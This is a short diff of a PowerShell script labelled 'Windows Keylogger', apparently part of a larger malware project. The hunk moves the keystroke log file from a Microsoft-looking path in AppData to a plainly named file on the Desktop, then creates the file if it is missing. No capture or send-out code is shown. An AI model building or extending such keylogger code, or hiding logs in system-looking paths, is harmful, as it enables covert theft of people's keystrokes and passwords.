@@ -1,5 +1,5 @@
 # Windows Keylogger:
-$path = "$env:APPDATA\Microsoft\Windows\WindowsKeyExtract.txt"
+$path = "$env:USERPROFILE\Desktop\keylogger.txt"
 
 
 if ((Test-Path $path) -eq $false) {New-Item $path}
